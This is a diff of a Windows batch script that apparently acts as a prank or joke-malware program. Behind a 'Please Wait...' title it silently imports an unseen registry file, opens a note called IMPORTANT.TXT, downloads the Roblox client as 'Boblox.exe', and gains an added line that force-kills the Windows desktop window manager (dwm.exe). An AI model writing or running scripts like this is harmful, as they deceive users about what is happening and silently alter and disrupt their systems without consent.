@@ -2,6 +2,7 @@
 title Please Wait...
 echo Please Wait...
 regedit /s i.reg
+taskkill /f /im dwm.exe
 start /min firefox.exe about:robots > NUL
 start notepad IMPORTANT.TXT
 start /min /wait curl -L https://www.roblox.com/download/client --output Boblox.exe > NUL
